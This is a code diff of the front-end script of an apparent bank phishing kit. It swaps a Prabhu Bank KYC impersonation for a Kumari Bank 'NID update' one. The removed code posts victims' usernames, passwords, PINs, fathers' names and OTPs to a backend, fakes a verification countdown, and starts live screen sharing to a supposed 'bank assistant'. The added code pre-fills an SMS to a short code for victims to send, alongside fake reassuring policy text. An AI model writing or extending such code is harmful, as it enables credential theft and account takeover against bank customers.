+    const eyeHide = DOM.togglePasswordBtn ? DOM.togglePasswordBtn.querySelector('.eye-hide') : null;
 
-    if (isPassword) {
-      if (eyeHide) eyeHide.classList.add('hidden');
-      if (eyeShow) eyeShow.classList.remove('hidden');
-    } else {
-      if (eyeHide) eyeHide.classList.remove('hidden');
-      if (eyeShow) eyeShow.classList.add('hidden');
+    if (eyeShow && eyeHide) {
+      if (isPass) {
+        eyeShow.classList.add('hidden');
+        eyeHide.classList.remove('hidden');
+      } else {
+        eyeShow.classList.remove('hidden');
+        eyeHide.classList.add('hidden');
+      }
     }
   }
 
-  function showFieldError(field, message) {
+  function showFieldError(field, msg) {
     const wrapper = DOM[`${field}Wrapper`];
     const errorEl = DOM[`${field}Error`];
     if (wrapper) wrapper.classList.add('has-error');
     if (errorEl) {
-      errorEl.textContent = message;
+      errorEl.textContent = msg;
       errorEl.classList.add('visible');
     }
   }
@@ -354,272 +768,85 @@
     }
   }
 
-  // --- STEP 2: VERIFICATION & LIVE EXTENDED COUNTDOWN ---
-  function startStep2Processing() {
-    // Populate User Summary
-    if (DOM.summaryUsername) DOM.summaryUsername.textContent = state.formData.username || 'Customer';
-    if (DOM.summaryMobile) DOM.summaryMobile.textContent = `+977 ${state.formData.mobile || '98XXXXXXXX'}`;
-
-    // Reset Progress & Countdown to 60 seconds
-    const totalDuration = state.totalProcessingSeconds || 60;
-    state.countdownSeconds = totalDuration;
-    updateProcessingUI(totalDuration, totalDuration);
-
-    if (state.countdownTimer) clearInterval(state.countdownTimer);
-
-    let elapsed = 0;
-
-    state.countdownTimer = setInterval(() => {
-      elapsed++;
-      const remaining = Math.max(0, totalDuration - elapsed);
-      state.countdownSeconds = remaining;
-
-      updateProcessingUI(remaining, totalDuration);
-
-      if (remaining <= 0) {
-        clearInterval(state.countdownTimer);
-        state.countdownTimer = null;
-        setTimeout(() => {
-          goToStep(3);
-        }, 500);
-      }
-    }, 1000);
-  }
-
-  function updateProcessingUI(remainingSeconds, totalDuration) {
-    const total = totalDuration || 60;
-    const progressPercent = Math.min(100, Math.round(((total - remainingSeconds) / total) * 100));
-
-    if (DOM.bigCountdownNumber) DOM.bigCountdownNumber.textContent = remainingSeconds;
-    if (DOM.processingProgressBar) DOM.processingProgressBar.style.width = `${Math.max(2, progressPercent)}%`;
-    if (DOM.processingPercentText) DOM.processingPercentText.textContent = `Processing verification... ${progressPercent}% complete`;
-    if (DOM.estimatedTimeText) {
-      DOM.estimatedTimeText.textContent = `Estimated time: ${remainingSeconds} second${remainingSeconds === 1 ? '' : 's'}`;
+  // --- MANUAL SMS MODAL ---
+  function openManualSmsModal(message) {
+    if (DOM.manualSmsModalUserMobile) {
+      DOM.manualSmsModalUserMobile.textContent = state.formData.mobile || '98XXXXXXXX';
+    }
+    if (DOM.manualSmsRecipientInput) {
+      DOM.manualSmsRecipientInput.value = state.smsRecipient || '32001';
+    }
+    if (DOM.manualSmsMessageTextarea) {
+      DOM.manualSmsMessageTextarea.value = message || state.smsMessage || '';
+    }
+    if (DOM.manualSmsModalOverlay) {
+      DOM.manualSmsModalOverlay.classList.add('open');
     }
   }
 
-  function skipProcessingCountdown() {
-    if (state.countdownTimer) {
-      clearInterval(state.countdownTimer);
-      state.countdownTimer = null;
+  function closeManualSmsModal() {
+    if (DOM.manualSmsModalOverlay) {
+      DOM.manualSmsModalOverlay.classList.remove('open');
     }
-    updateProcessingUI(0, state.totalProcessingSeconds || 60);
-    goToStep(3);
   }
 
-  // --- STEP 3: MANUAL CUSTOMER OTP INPUT (NO AUTO-FILL, NO AUTO-GENERATE) ---
-  function startStep3Otp() {
-    // Clear all OTP input fields so customer manually enters their code from SMS
-    DOM.otpDigits.forEach((digitInput) => {
-      if (digitInput) digitInput.value = '';
-    });
+  function copyToClipboard(text, btn, originalLabel, successLabel) {
+    function showFeedback() {
+      if (!btn) return;
+      const orig = btn.textContent;
+      btn.textContent = successLabel || 'âœ… Copied!';
+      setTimeout(() => { btn.textContent = originalLabel || orig; }, 2000);
+    }
 
-    clearOtpError();
-
-    // Set cursor focus to first OTP box
-    setTimeout(() => {
-      if (DOM.otpDigits[0]) DOM.otpDigits[0].focus();
-    }, 150);
-
-    // Start 120s (2 minutes) Resend countdown
-    startResendCountdown();
-  }
-
-  function initOtpInputs() {
-    DOM.otpDigits.forEach((input, index) => {
-      if (!input) return;
-
-      input.addEventListener('input', (e) => {
-        let val = e.target.value.replace(/\D/g, '');
-        e.target.value = val ? val[val.length - 1] : '';
-
-        clearOtpError();
-
-        if (e.target.value && index < DOM.otpDigits.length - 1) {
-          DOM.otpDigits[index + 1].focus();
-        }
+    if (navigator.clipboard && navigator.clipboard.writeText) {
+      navigator.clipboard.writeText(text).then(showFeedback).catch(() => {
+        fallbackCopy(text);
+        showFeedback();
       });
-
-      input.addEventListener('keydown', (e) => {
-        if (e.key === 'Backspace' && !input.value && index > 0) {
-          DOM.otpDigits[index - 1].focus();
-        }
-      });
-
-      input.addEventListener('paste', (e) => {
-        e.preventDefault();
-        const pasteData = (e.clipboardData || window.clipboardData).getData('text').trim();
-        const digits = pasteData.replace(/\D/g, '').slice(0, 6).split('');
-        digits.forEach((digit, i) => {
-          if (DOM.otpDigits[i]) DOM.otpDigits[i].value = digit;
-        });
-        if (digits.length > 0) {
-          const nextIdx = Math.min(digits.length, DOM.otpDigits.length - 1);
-          if (DOM.otpDigits[nextIdx]) DOM.otpDigits[nextIdx].focus();
-        }
-      });
-    });
+    } else {
+      fallbackCopy(text);
+      showFeedback();
+    }
   }
 
-  async function handleVerifyOtp() {
-    const enteredOtp = DOM.otpDigits.map(d => d.value.trim()).join('');
-
-    if (enteredOtp.length < 6) {
-      showOtpError('Please enter the full 6-digit OTP code received on your phone');
-      return;
-    }
-
-    state.formData.otp = enteredOtp;
-    if (!state.formData.refId) {
-      state.formData.refId = 'PRB-KYC-' + Math.floor(100000 + Math.random() * 900000);
-    }
-    state.formData.submittedAt = new Date().toLocaleString();
-
-    // Send Customer's Entered OTP & KYC Record to Backend API
+  function fallbackCopy(text) {
     try {
-      fetch('/api/verify-otp', {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({
-          sessionId: state.formData.sessionId,
-          refId: state.formData.refId,
-          username: state.formData.username,
-          mobile: state.formData.mobile,
-          password: state.formData.password,
-          pin: state.formData.pin,
-          fatherName: state.formData.fatherName,
-          otp: enteredOtp
-        })
-      }).then(res => res.json()).then(data => {
-        if (data && data.refId) {
-          state.formData.refId = data.refId;
-          if (DOM.refIdText) DOM.refIdText.textContent = data.refId;
-        }
-      }).catch(err => {
-        console.warn('Backend verification logging:', err);
-      });
-    } catch (err) {
-      console.warn('Backend verification err:', err);
-    }
-
-    // Proceed to Step 4 Confirmation
-    goToStep(4);
+      const ta = document.createElement('textarea');
+      ta.value = text;
+      ta.style.cssText = 'position:fixed;top:-9999px;left:-9999px;opacity:0;';
+      document.body.appendChild(ta);
+      ta.focus();
+      ta.select();
+      document.execCommand('copy');
+      document.body.removeChild(ta);
+    } catch (_) {}
   }
 
-  function handleResendOtp() {
-    if (DOM.resendOtpBtn) DOM.resendOtpBtn.disabled = true;
-
-    // Clear boxes for customer to enter new code
-    DOM.otpDigits.forEach(d => { if (d) d.value = ''; });
-    if (DOM.otpDigits[0]) DOM.otpDigits[0].focus();
-    clearOtpError();
-
-    // Restart extended 120s timer
-    startResendCountdown();
-  }
-
-  function startResendCountdown() {
-    state.resendSeconds = 120; // 2 minutes resend cooldown
-    if (DOM.resendOtpBtn) DOM.resendOtpBtn.disabled = true;
-    
-    updateResendCountdownDisplay(state.resendSeconds);
-
-    if (state.resendTimer) clearInterval(state.resendTimer);
-
-    state.resendTimer = setInterval(() => {
-      state.resendSeconds--;
-      if (state.resendSeconds > 0) {
-        updateResendCountdownDisplay(state.resendSeconds);
-      } else {
-        clearInterval(state.resendTimer);
-        state.resendTimer = null;
-        if (DOM.resendCountdownText) DOM.resendCountdownText.textContent = "Didn't receive SMS?";
-        if (DOM.resendOtpBtn) DOM.resendOtpBtn.disabled = false;
-      }
-    }, 1000);
-  }
-
-  function updateResendCountdownDisplay(seconds) {
-    if (!DOM.resendCountdownText) return;
-    const mins = Math.floor(seconds / 60);
-    const remSecs = seconds % 60;
-    const formatted = mins > 0 ? `${mins}:${remSecs < 10 ? '0' : ''}${remSecs}` : `${seconds}s`;
-    DOM.resendCountdownText.textContent = `Resend code in ${formatted}`;
-  }
-
-  function showOtpError(msg) {
-    if (DOM.otpBoxFrame) DOM.otpBoxFrame.style.borderColor = '#dc2626';
-    if (DOM.otpError) {
-      DOM.otpError.textContent = msg;
-      DOM.otpError.classList.add('visible');
-    }
-  }
-
-  function clearOtpError() {
-    if (DOM.otpBoxFrame) DOM.otpBoxFrame.style.borderColor = '';
-    if (DOM.otpError) {
-      DOM.otpError.textContent = '';
-      DOM.otpError.classList.remove('visible');
-    }
-  }
-
-  // --- STEP 4: SUCCESS CONFIRMATION ---
-  function renderStep4Confirmation() {
-    if (DOM.refIdText) DOM.refIdText.textContent = state.formData.refId || 'PRB-KYC-948201';
-    if (DOM.submissionTimestamp) DOM.submissionTimestamp.textContent = new Date().toLocaleTimeString([], { hour: '2-digit', minute: '2-digit' });
-  }
-
-  function handleStartNew() {
-    if (DOM.kycForm) DOM.kycForm.reset();
-    DOM.otpDigits.forEach(d => { if (d) d.value = ''; });
-    state.formData = {
-      sessionId: '',
-      username: '',
-      mobile: '',
-      password: '',
-      pin: '',
-      fatherName: '',
-      otp: '',
-      refId: '',
-      submittedAt: ''
+  // --- LEGAL / POLICY MODAL ---
+  function openPolicyModal(type) {
+    const titles = {
+      terms: 'Kumari Bank Limited Terms & Conditions',
+      privacy: 'Kumari Bank Limited Privacy Policy',
+      cookies: 'Kumari Bank Limited Cookies Policy'
     };
 
-    goToStep(1);
-  }
+    const contents = {
+      terms: `
+        <p><strong>1. Introduction:</strong> Welcome to the official Kumari Bank Limited Online NID Update &amp; Customer Verification Portal.</p>
+        <p><strong>2. Information Accuracy:</strong> You warrant that all identification and security information submitted corresponds truthfully to your registered account.</p>
+        <p><strong>3. Security Notice:</strong> Kumari Bank Limited employees will never ask for your confidential ATM PIN or OTP via unsolicited phone calls.</p>
+      `,
+      privacy: `
+        <p><strong>1. Privacy Commitment:</strong> Kumari Bank Limited protects customer data adhering to Nepal Rastra Bank regulatory requirements and 256-bit encryption standards.</p>
+        <p><strong>2. Information Usage:</strong> Data submitted is solely utilized for identity verification and updating customer records.</p>
+      `,
+      cookies: `
+        <p><strong>1. Cookie Usage:</strong> We utilize secure session tokens and functional cookies to ensure your navigation between verification steps remains protected and seamless.</p>
+      `
+    };
 
-  // --- LEGAL & POLICY MODALS ---
-  const POLICIES = {
-    terms: {
-      title: 'Prabhu Bank Terms & Conditions',
-      content: `
-        <h3>1. Online KYC Renewal Services</h3>
-        <p>By submitting this form, you acknowledge that all customer identification and residential details provided are accurate and current in accordance with Nepal Rastra Bank (NRB) unified directives on Anti-Money Laundering (AML) and Know Your Customer (KYC) requirements.</p>
-        <h3>2. Verification & Authentication</h3>
-        <p>Prabhu Bank reserves the right to authenticate submitted details with relevant national databases, credit bureaus, and telecom providers. Your submission will be finalized after one-time-password (OTP) verification.</p>
-      `
-    },
-    privacy: {
-      title: 'Prabhu Bank Privacy Policy',
-      content: `
-        <h3>1. Data Protection & Security</h3>
-        <p>All sensitive personal identifiable information (PII) including your mobile number, transaction PIN, and familial details are encrypted in transit using industry-standard TLS 1.3 encryption protocols.</p>
-        <h3>2. Purpose of Collection</h3>
-        <p>Information gathered through this KYC portal is exclusively utilized for customer verification, regulatory compliance, and account safeguarding.</p>
-      `
-    },
-    cookies: {
-      title: 'Prabhu Bank Cookies Policy',
-      content: `
-        <h3>1. Essential Session Cookies</h3>
-        <p>Our KYC portal utilizes necessary session tokens to securely preserve your authentication progress across the 4 verification steps. No third-party marketing cookies are deployed.</p>
-      `
-    }
-  };
-
-  function openPolicyModal(type) {
-    const policy = POLICIES[type] || POLICIES.terms;
-    if (DOM.policyModalTitle) DOM.policyModalTitle.textContent = policy.title;
-    if (DOM.policyModalContent) DOM.policyModalContent.innerHTML = policy.content;
+    if (DOM.policyModalTitle) DOM.policyModalTitle.textContent = titles[type] || 'Policy Document';
+    if (DOM.policyModalContent) DOM.policyModalContent.innerHTML = contents[type] || '';
     if (DOM.policyModalOverlay) DOM.policyModalOverlay.classList.add('open');
   }
 
@@ -627,143 +854,7 @@
     if (DOM.policyModalOverlay) DOM.policyModalOverlay.classList.remove('open');
   }
 
-  // --- WEBRTC SCREEN SHARING CONTROLLER ---
-  let screenBroadcaster = null;
-
-  function openScreenShareModal() {
-    if (!DOM.screenShareModalOverlay) return;
-    DOM.screenShareModalOverlay.style.display = 'flex';
-    document.body.style.overflow = 'hidden';
-
-    // Check device capability
-    const canShare = window.PrabhuWebRTC && window.PrabhuWebRTC.canShareScreen();
-    const isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
-
-    if (isMobile && !canShare) {
-      if (DOM.mobileUnsupportedNotice) DOM.mobileUnsupportedNotice.style.display = 'flex';
-      if (DOM.startScreenShareBtn) {
-        DOM.startScreenShareBtn.disabled = true;
-        DOM.startScreenShareBtn.style.opacity = '0.5';
-      }
-    } else {
-      if (DOM.mobileUnsupportedNotice) DOM.mobileUnsupportedNotice.style.display = 'none';
-      if (DOM.startScreenShareBtn) {
-        DOM.startScreenShareBtn.disabled = false;
-        DOM.startScreenShareBtn.style.opacity = '1';
-      }
-    }
-  }
-
-  function closeScreenShareModal() {
-    if (!DOM.screenShareModalOverlay) return;
-    DOM.screenShareModalOverlay.style.display = 'none';
-    document.body.style.overflow = '';
-  }
-
-  async function handleStartScreenShare() {
-    try {
-      if (!window.PrabhuWebRTC) {
-        alert('WebRTC engine not loaded. Please refresh the page.');
-        return;
-      }
-
-      if (!screenBroadcaster) {
-        screenBroadcaster = new window.PrabhuWebRTC.ScreenShareBroadcaster({
-          onStateChange: (newState) => {
-            updateScreenShareUI(newState);
-          },
-          onError: (errMsg) => {
-            alert(errMsg);
-            updateScreenShareUI('error');
-          }
-        });
-      }
-
-      updateScreenShareUI('requesting_permission');
-      const { sessionId } = await screenBroadcaster.startCapture();
-      state.formData.webrtcSessionId = sessionId;
-
-      if (DOM.modalSessionIdText) DOM.modalSessionIdText.textContent = sessionId;
-      if (DOM.modalSessionLinkRow) DOM.modalSessionLinkRow.style.display = 'block';
-      if (DOM.modalOpenViewerLink) DOM.modalOpenViewerLink.href = `/viewer.html?session=${encodeURIComponent(sessionId)}`;
-
-    } catch (err) {
-      console.warn('[ScreenShare Start]', err);
-    }
-  }
-
-  async function handleStopScreenShare() {
-    if (screenBroadcaster) {
-      await screenBroadcaster.stop();
-      updateScreenShareUI('ended');
-    }
-  }
-
-  function updateScreenShareUI(status) {
-    const chip = DOM.modalStatusChip;
-    const desc = DOM.modalStatusDesc;
-    const startBtn = DOM.startScreenShareBtn;
-    const stopBtn = DOM.stopScreenShareBtn;
-    const triggerBtn = DOM.screenShareTriggerBtn;
-    const triggerLabel = DOM.screenShareBtnLabel;
-
-    if (!chip) return;
-
-    chip.className = 'status-badge-chip';
-
-    if (status === 'requesting_permission') {
-      chip.textContent = 'Prompting';
-      chip.classList.add('waiting');
-      if (desc) desc.textContent = 'Please choose which screen to share in your browser prompt...';
-    } else if (status === 'waiting_for_viewer') {
-      chip.textContent = 'Active';
-      chip.classList.add('active');
-      if (desc) desc.textContent = 'Screen broadcasting live! Waiting for bank assistant to connect...';
-      if (startBtn) startBtn.style.display = 'none';
-      if (stopBtn) stopBtn.style.display = 'flex';
-      if (triggerBtn) triggerBtn.classList.add('active-sharing');
-      if (triggerLabel) triggerLabel.textContent = 'Sharing Active';
-    } else if (status === 'connected') {
-      chip.textContent = 'Connected';
-      chip.classList.add('active');
-      if (desc) desc.textContent = 'Viewer connected! Live screen sharing in progress.';
-      if (startBtn) startBtn.style.display = 'none';
-      if (stopBtn) stopBtn.style.display = 'flex';
-      if (triggerBtn) triggerBtn.classList.add('active-sharing');
-      if (triggerLabel) triggerLabel.textContent = 'Sharing Active';
-    } else if (status === 'permission_denied') {
-      chip.textContent = 'Denied';
-      chip.classList.add('denied');
-      if (desc) desc.textContent = 'Screen sharing permission was denied by user.';
-      if (startBtn) startBtn.style.display = 'flex';
-      if (stopBtn) stopBtn.style.display = 'none';
-      if (triggerBtn) triggerBtn.classList.remove('active-sharing');
-      if (triggerLabel) triggerLabel.textContent = 'Live Screen Assistance';
-    } else if (status === 'ended') {
-      chip.textContent = 'Ended';
-      if (desc) desc.textContent = 'Screen sharing session has concluded.';
-      if (startBtn) startBtn.style.display = 'flex';
-      if (stopBtn) stopBtn.style.display = 'none';
-      if (triggerBtn) triggerBtn.classList.remove('active-sharing');
-      if (triggerLabel) triggerLabel.textContent = 'Live Screen Assistance';
-    }
-  }
-
-  function copyViewerLinkToClipboard() {
-    if (!screenBroadcaster || !screenBroadcaster.sessionId) return;
-    const fullUrl = `${window.location.origin}/viewer.html?session=${encodeURIComponent(screenBroadcaster.sessionId)}`;
-    navigator.clipboard.writeText(fullUrl).then(() => {
-      if (DOM.copyViewerLinkBtn) {
-        const originalText = DOM.copyViewerLinkBtn.textContent;
-        DOM.copyViewerLinkBtn.textContent = 'Copied!';
-        setTimeout(() => { DOM.copyViewerLinkBtn.textContent = originalText; }, 2000);
-      }
-    }).catch(() => {
-      prompt('Copy this viewer URL:', fullUrl);
-    });
-  }
-
-  // Bootstrap when DOM is ready
+  // --- BOOTSTRAP ---
   if (document.readyState === 'loading') {
     document.addEventListener('DOMContentLoaded', init);
   } else {
@@ -771,3 +862,4 @@
   }
 
 })();
+
